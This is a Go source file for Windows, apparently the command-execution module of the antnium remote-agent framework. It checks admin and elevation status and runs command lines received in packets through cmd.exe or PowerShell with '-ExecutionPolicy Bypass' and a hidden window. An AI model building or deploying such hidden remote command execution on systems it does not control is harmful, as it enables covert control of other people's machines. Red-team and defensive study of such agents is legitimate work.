// +build windows

package arch

import (
	"context"
	"fmt"
	"os/exec"
	"syscall"
	"time"

	"github.com/dobin/antnium/pkg/model"
	"golang.org/x/sys/windows"
	"golang.org/x/text/encoding/charmap"
)

// https://coolaj86.com/articles/golang-and-windows-and-admins-oh-my/
func GetPermissions() (bool, bool, error) {
	var sid *windows.SID

	// Although this looks scary, it is directly copied from the
	// official windows documentation. The Go API for this is a
	// direct wrap around the official C++ API.
	// See https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-checktokenmembership
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false, false, err
	}

	// This appears to cast a null pointer so I'm not sure why this
	// works, but this guy says it does and it Works for Me™:
	// https://github.com/golang/go/issues/28804#issuecomment-438838144
	token := windows.Token(0)

	member, err := token.IsMember(sid)
	if err != nil {
		return false, false, err
	}

	// Also note that an admin is _not_ necessarily considered
	// elevated.
	// For elevation see https://github.com/mozey/run-as-admin

	isElevated := token.IsElevated()
	isAdmin := member
	return isElevated, isAdmin, nil
}

func ExecOutputDecode(data []byte) string {
	d := charmap.CodePage850.NewDecoder()
	outDecoded, err := d.Bytes(data)
	if err != nil {
		// Fall back to stdout if decoding failed
		return string(data)
	} else {
		return string(outDecoded)
	}
}

func Exec(packetArgument model.PacketArgument) ([]byte, []byte, int, int, error) {
	stdOut := make([]byte, 0)
	stdErr := make([]byte, 0)
	pid := 0
	exitCode := 0
	var err error
	err = nil

	processTimeout := 10 * time.Second
	ctx, cancel := context.WithTimeout(context.Background(), processTimeout)
	defer cancel()

	shellType, ok := packetArgument["shelltype"]
	if !ok {
		return stdOut, stdErr, pid, exitCode, fmt.Errorf("No argument 'shelltype' given")
	}

	var cmd *exec.Cmd
	if shellType == "cmd" {
		commandStr, ok := packetArgument["commandline"]
		if !ok {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("No argument 'commandline' given")
		}
		cmd = exec.CommandContext(ctx, "cmd.exe")
		cmd.SysProcAttr = getSysProcAttrs()
		cmd.SysProcAttr.CmdLine = fmt.Sprintf(`cmd.exe /S /C "%s"`, commandStr)
	} else if shellType == "powershell" {
		commandStr, ok := packetArgument["commandline"]
		if !ok {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("No argument 'commandline' given")
		}

		cmd = exec.CommandContext(ctx, "powershell.exe", "-ExecutionPolicy", "Bypass", "-C", commandStr)
		cmd.SysProcAttr = getSysProcAttrs()
	} else if shellType == "raw" {
		executable, args, err := model.MakePacketArgumentFrom(packetArgument)
		if err != nil {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Invalid packet arguments")
		}
		cmd = exec.CommandContext(ctx, executable, args...)
	} else {
		return stdOut, stdErr, pid, exitCode, fmt.Errorf("Unknown shelltype: %s", shellType)
	}

	stdOut, err = cmd.Output()
	if err != nil {
		if exitError, ok := err.(*exec.ExitError); ok {
			stdErr = exitError.Stderr
			pid = exitError.Pid()
			exitCode = exitError.ProcessState.ExitCode()
		} else {
			pid = 0
			exitCode = cmd.ProcessState.ExitCode()

		}
	} else {
		pid = cmd.ProcessState.Pid()
		exitCode = cmd.ProcessState.ExitCode()
	}
	return stdOut, stdErr, pid, exitCode, err
}

func getSysProcAttrs() *syscall.SysProcAttr {
	return &syscall.SysProcAttr{
		HideWindow: true,
	}
}
